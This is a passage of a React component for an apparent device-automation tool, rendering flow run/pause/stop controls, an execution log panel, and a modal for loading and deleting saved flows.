            <button onClick={runFlow} style={btnGreen}>Run Flow</button>
          ) : (
            <>
              <button onClick={pauseFlow} style={btnAmber}>{paused ? 'Resume' : 'Pause'}</button>
              <button onClick={stopFlow} style={btnDanger}>Stop</button>
            </>
          )}

          {running && currentNodeId && (
            <span style={{ fontSize: 11, color: DS.accent, fontFamily: DS.mono }}>
              executing {currentNodeId}
            </span>
          )}

          <div style={{ marginLeft: 'auto' }}>
            <button onClick={() => setExecLog([])} style={{ ...btnGhost, fontSize: 11, height: 26 }}>Clear Log</button>
          </div>
        </div>

        <div style={{
          background: DS.bg,
          border: `1px solid ${DS.border}`,
          borderRadius: 6, padding: '8px 12px', height: 90, overflowY: 'auto',
          fontFamily: DS.mono, fontSize: 11, color: DS.text2,
        }}>
          {execLog.length === 0 && (
            <div style={{ color: DS.text2, opacity: 0.6 }}>No executions yet. Select a device and click Run Flow.</div>
          )}
          {execLog.map((entry, i) => (
            <div key={i} style={{ marginBottom: 2 }}>
              <span style={{ color: DS.text2, marginRight: 8, opacity: 0.5 }}>{entry.ts}</span>
              <span style={{ color: entry.msg.includes('  OK') ? DS.green : entry.msg.includes('  ERR') ? DS.red : DS.text }}>
                {entry.msg}
              </span>
            </div>
          ))}
        </div>
      </div>

      {/* Saved flows modal */}
      {showSaved && (
        <div
          style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.7)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 100 }}
          onClick={() => setShowSaved(false)}
        >
          <div
            style={{
              background: DS.surface, border: `1px solid ${DS.borderMd}`, borderRadius: 10,
              width: 420, maxHeight: 500, display: 'flex', flexDirection: 'column', overflow: 'hidden',
            }}
            onClick={e => e.stopPropagation()}
          >
            <div style={{
              padding: '12px 16px', borderBottom: `1px solid ${DS.border}`,
              display: 'flex', alignItems: 'center', justifyContent: 'space-between',
            }}>
              <span style={{ fontSize: 14, fontWeight: 700, color: DS.text }}>Saved Flows</span>
              <button onClick={() => setShowSaved(false)} style={{ background: 'none', border: 'none', color: DS.text2, fontSize: 18, cursor: 'pointer', lineHeight: 1 }}>x</button>
            </div>
            <div style={{ flex: 1, overflowY: 'auto', padding: 12 }}>
              {savedFlows.length === 0 && (
                <div style={{ color: DS.text2, fontSize: 13, textAlign: 'center', padding: '20px 0' }}>No saved flows.</div>
              )}
              {savedFlows.map(f => (
                <div key={f.key} style={{
                  display: 'flex', alignItems: 'center', gap: 8, padding: '10px 12px',
                  background: DS.surface3, borderRadius: 8, marginBottom: 8,
                  border: `1px solid ${DS.border}`,
                }}>
                  <div style={{ flex: 1 }}>
                    <div style={{ fontSize: 13, fontWeight: 600, color: DS.text }}>{f.name}</div>
                    <div style={{ fontSize: 11, color: DS.text2 }}>
                      {f.nodes?.length ?? 0} nodes - {f.savedAt ? new Date(f.savedAt).toLocaleString() : ''}
                    </div>
                  </div>
                  <button onClick={() => loadFlow(f)} style={{ ...btnBase, background: 'transparent', border: `1px solid ${DS.borderHi}`, color: DS.accent, height: 26, fontSize: 11 }}>Load</button>
                  <button onClick={() => deleteFlow(f.key)} style={{ ...btnBase, background: 'transparent', border: '1px solid rgba(239,68,68,0.3)', color: DS.red, height: 26, fontSize: 11 }}>Del</button>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
